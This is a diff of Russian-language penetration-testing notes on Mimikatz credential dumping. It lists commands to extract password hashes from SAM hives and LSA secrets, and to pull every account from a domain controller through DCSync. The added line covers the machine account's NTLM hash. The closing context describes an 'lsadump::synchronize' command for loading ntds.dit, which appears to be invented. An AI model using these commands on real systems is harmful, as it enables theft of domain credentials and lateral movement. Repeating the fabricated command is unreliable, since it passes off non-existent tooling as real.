@@ -33,6 +33,9 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 - lsadump::dcsync /all /csv - дампим ntds.dit с контроллера
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
+- lsadump::secrets  - ntlm аккаунта машины
+
+  
 Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:
 
 1. Загрузите ntds.dit в память с помощью команды "lsadump::synchronize". Например:
